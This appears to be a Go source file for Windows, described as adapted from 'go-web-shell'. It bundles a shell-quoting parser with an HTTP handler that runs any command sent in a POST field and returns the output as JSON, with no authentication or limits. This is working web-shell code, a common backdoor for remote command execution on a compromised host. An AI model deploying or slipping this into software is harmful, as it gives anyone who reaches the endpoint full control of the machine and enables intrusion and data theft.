//go:build windows

package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"unicode/utf8"
)

// From mattiasinsaurralde's go-web-shell.

// kballard: go-shellquote

var (
	UnterminatedSingleQuoteError = errors.New("Unterminated single-quoted string")
	UnterminatedDoubleQuoteError = errors.New("Unterminated double-quoted string")
	UnterminatedEscapeError      = errors.New("Unterminated backslash-escape")
)

var (
	splitChars        = " \n\t"
	singleChar        = '\''
	doubleChar        = '"'
	escapeChar        = '\\'
	doubleEscapeChars = "$`\"\n\\"
)

func Split(input string) (words []string, err error) {
	var buf bytes.Buffer
	words = make([]string, 0)

	for len(input) > 0 {
		// skip any splitChars at the start
		c, l := utf8.DecodeRuneInString(input)
		if strings.ContainsRune(splitChars, c) {
			input = input[l:]
			continue
		}

		var word string
		word, input, err = splitWord(input, &buf)
		if err != nil {
			return
		}
		words = append(words, word)
	}
	return
}

func splitWord(input string, buf *bytes.Buffer) (word string, remainder string, err error) {
	buf.Reset()

raw:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == singleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto single
			} else if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto double
			} else if c == escapeChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto escape
			} else if strings.ContainsRune(splitChars, c) {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				return buf.String(), cur, nil
			}
		}
		if len(input) > 0 {
			buf.WriteString(input)
			input = ""
		}
		goto done
	}

escape:
	{
		if len(input) == 0 {
			return "", "", UnterminatedEscapeError
		}
		c, l := utf8.DecodeRuneInString(input)
		if c == '\n' {
		} else {
			buf.WriteString(input[:l])
		}
		input = input[l:]
	}
	goto raw

single:
	{
		i := strings.IndexRune(input, singleChar)
		if i == -1 {
			return "", "", UnterminatedSingleQuoteError
		}
		buf.WriteString(input[0:i])
		input = input[i+1:]
		goto raw
	}

double:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto raw
			} else if c == escapeChar {
				c2, l2 := utf8.DecodeRuneInString(cur)
				cur = cur[l2:]
				if strings.ContainsRune(doubleEscapeChars, c2) {
					buf.WriteString(input[0 : len(input)-len(cur)-l-l2])
					if c2 == '\n' {
					} else {
						buf.WriteRune(c2)
					}
					input = cur
				}
			}
		}
		return "", "", UnterminatedDoubleQuoteError
	}

done:
	return buf.String(), input, nil
}

// go-shellquote ends here.

func run_cmd(s string) map[string]string {

	fmt.Println("exec:", s)

	args, _ := Split(s)

	// cmd := exec.Command( s )

	cmd := exec.Command(args[0], args[1:]...)

	var out bytes.Buffer
	var errorOutput bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &errorOutput

	err2 := cmd.Run()

	outputString := out.String()

	outputMap := make(map[string]string)

	if err2 != nil {
		outputMap["Result"] = ""
		outputMap["Error"] = err2.Error()
		outputMap["ErrorString"] = errorOutput.String()
		log.Println(err2)
		// return errorOutput.String()
		return outputMap
	}

	outputString = strings.Replace(outputString, "\n", "<br />", -1)
	outputMap["Result"] = outputString
	outputMap["Error"] = ""
	outputMap["ErrorString"] = ""

	return outputMap

}

type shellHandler struct{}

func (h *shellHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {

	// fmt.Fprintf(w, "<!doctype html><head><meta charset=\"utf-8\" /><title>go-web-shell</title></head><body><form method=\"post\"><input type=\"text\" name=\"c\" id=\"c\" size=\"50\" /><br /><input type=\"submit\" value=\"Ok\" /></form><script>document.getElementById('c').focus();</script></body></html>")

	if r.Method == "POST" {
		input_cmd := r.FormValue("c")

		fmt.Println(input_cmd)

		cmd_result := run_cmd(input_cmd)

		// Write response
		w.Header().Set("Content-Type", "application/json")
		responseData := make(map[string]string)

		responseData["Command"] = input_cmd

		// Copy fields from cmd_result map.
		responseData["Result"] = cmd_result["Result"]
		responseData["Error"] = cmd_result["Error"]
		responseData["ErrorString"] = cmd_result["ErrorString"]

		jsonResp, marshall_err := json.Marshal(responseData)
		if marshall_err != nil {
			log.Printf("Error marshalling response: %s", marshall_err)
		}
		w.Write(jsonResp)

		return
	}
}
